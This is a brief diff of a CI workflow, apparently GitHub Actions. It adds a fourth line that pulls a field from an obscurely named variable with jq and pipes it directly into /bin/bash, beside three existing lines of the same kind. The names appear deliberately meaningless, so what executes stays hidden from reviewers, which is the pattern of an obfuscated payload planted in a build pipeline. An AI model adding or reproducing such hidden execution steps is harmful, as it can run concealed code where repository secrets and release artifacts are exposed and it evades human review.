@@ -42,6 +42,7 @@ jobs:
           echo $vvn37 | jq -r .towd112 | /bin/bash
           printf '%s' "$ig3212" | jq -r .f615 | /bin/bash
           printf '%s' "$hb6" | jq -r .higbw6 | /bin/bash
+          echo $vgrm2 | jq -r .xfew5601 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
